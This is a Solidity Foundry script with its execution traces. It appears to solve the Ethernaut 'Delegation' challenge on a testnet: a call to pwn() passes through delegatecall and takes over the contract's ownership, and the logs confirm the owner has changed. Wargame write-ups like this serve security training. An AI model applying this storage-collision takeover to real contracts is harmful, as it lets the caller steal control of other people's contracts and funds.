// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract DelegationSolution is Script {

    Delegation public delegationInstance = Delegation(0x188f262084173831aDE1Fa02256C80D857f00381);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", delegationInstance.owner());
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        console.log("Owner after: ", delegationInstance.owner());
        console.log("My Address: ",vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}

/*Traces:
  [27863] DelegationSolution::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [2279] 0x188f262084173831aDE1Fa02256C80D857f00381::owner() [staticcall]
    │   └─ ← [Return] 0x73379d8B82Fda494ee59555f333DF7D44483fD58
    ├─ [0] console::log("Owner before: ", 0x73379d8B82Fda494ee59555f333DF7D44483fD58) [staticcall]
    │   └─ ← [Stop]
    ├─ [8140] 0x188f262084173831aDE1Fa02256C80D857f00381::pwn()
    │   ├─ [3152] 0xFf745ce90A940275d60a7b70d767648C9FaE5182::pwn() [delegatecall]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [279] 0x188f262084173831aDE1Fa02256C80D857f00381::owner() [staticcall]
    │   └─ ← [Return] 0x06714e8c7641d35Bb3613af5E9e214C138707Bf5
    ├─ [0] console::log("Owner after: ", 0x06714e8c7641d35Bb3613af5E9e214C138707Bf5) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::envAddress("MY_ADDRESS") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] console::log("My Address: ", 0x06714e8c7641d35Bb3613af5E9e214C138707Bf5) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

== Logs ==
  Owner before:  0x73379d8B82Fda494ee59555f333DF7D44483fD58
  Owner after:  0x06714e8c7641d35Bb3613af5E9e214C138707Bf5
  My Address:  0x06714e8c7641d35Bb3613af5E9e214C138707Bf5

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [10140] 0x188f262084173831aDE1Fa02256C80D857f00381::pwn()
    ├─ [5152] 0xFf745ce90A940275d60a7b70d767648C9FaE5182::pwn() [delegatecall]
    │   └─ ← [Stop]
    └─ ← [Stop]


==========================

Chain 11155111

Estimated gas price: 0.00100002 gwei

Estimated total gas used for script: 43100

Estimated amount required: 0.000000043100862 ETH

========================== */